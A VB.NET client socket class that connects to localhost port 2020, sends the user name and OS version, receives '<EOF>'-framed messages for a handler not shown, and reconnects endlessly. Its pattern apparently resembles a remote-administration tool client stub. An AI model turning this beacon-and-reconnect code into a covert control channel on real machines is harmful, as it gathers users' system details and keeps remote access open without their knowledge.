Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.IO
Public Class ClientSocket

    Public Shared S As Socket
    Public Shared Buffer(1024 * 2000) As Byte
    Public Shared MS As New MemoryStream

    Public Shared EOF As String = "<EOF>"
    Public Shared SPL As String = "<N>"

    Public Shared isConnected As Boolean = False


    Public Shared Sub BeginConnect()

        Try
            Threading.Thread.Sleep(1000)
            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
            Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 2020)

            Buffer = New Byte(1024 * 2000) {}
            MS = New MemoryStream

            S.Connect(ipEndPoint)

            isConnected = True
            Send(Info)

            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)

            While isConnected
                Threading.Thread.Sleep(10 * 1000)
                If S.Poll(-1, SelectMode.SelectRead) And S.Available <= 0 Then
                    Exit While
                End If
            End While
            Disconnected()

        Catch ex As Exception
            Disconnected()
        End Try

    End Sub

    Private Shared Function Info()

        Dim OS As New Devices.ComputerInfo
        Return (String.Concat("INFO", SPL, Environment.UserName, SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))

    End Function

    Private Shared Sub EndReceive(ByVal ar As IAsyncResult)
        Try
            S = ar.AsyncState
            Dim Received As Integer = S.EndReceive(ar)
            If Received > 0 Then
                MS.Write(Buffer, 0, Received)
                If BS(MS.ToArray).Contains(EOF) Then

                    Dim T As New Threading.Thread(AddressOf Messages.Read)
                    T.Start(MS.ToArray)

                    MS.Flush()
                    MS.Dispose()
                    MS = New MemoryStream
                End If
            End If
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub Send(ByVal msg As String)
        Try
            Dim M As New MemoryStream
            M.Write(SB(msg), 0, msg.Length)
            M.Write(SB(EOF), 0, EOF.Length)
            S.BeginSend(M.ToArray, 0, M.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
            M.Flush()
            M.Dispose()
        Catch ex As Exception
            Disconnected()
        End Try
    End Sub

    Private Shared Sub EndSend(ByVal ar As IAsyncResult)
        Try
            S.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Disconnected()
        isConnected = False

        Try
            If S IsNot Nothing Then
                S.Close()
                S.Dispose()
                S = Nothing
            End If
        Catch ex As Exception
        End Try

        Try
            If MS IsNot Nothing Then
                MS.Dispose()
                MS = Nothing
            End If
        Catch ex As Exception
        End Try

        BeginConnect()

    End Sub


End Class
